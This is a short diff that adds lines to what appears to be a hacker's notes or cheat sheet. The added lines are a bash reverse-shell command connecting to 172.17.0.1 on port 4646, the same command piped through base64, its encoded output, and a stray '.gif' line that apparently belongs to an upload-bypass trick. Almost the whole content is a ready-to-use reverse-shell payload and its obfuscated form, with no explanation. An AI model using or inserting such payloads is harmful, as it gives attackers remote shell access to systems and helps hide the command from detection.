@@ -39,9 +39,12 @@ export SHELL=bash
 
 ___________________________________________________________________________________________
 
+.gif 
 
 
+echo -n '/bin/bash -i >& /dev/tcp/172.17.0.1/4646 0>&1' | base64  
 
+L2Jpbi9iYXNoIC1pID4mIC9kZXYvdGNwLzE3Mi4xNy4wLjEvNDY0NiAwPiYx
 
 
 
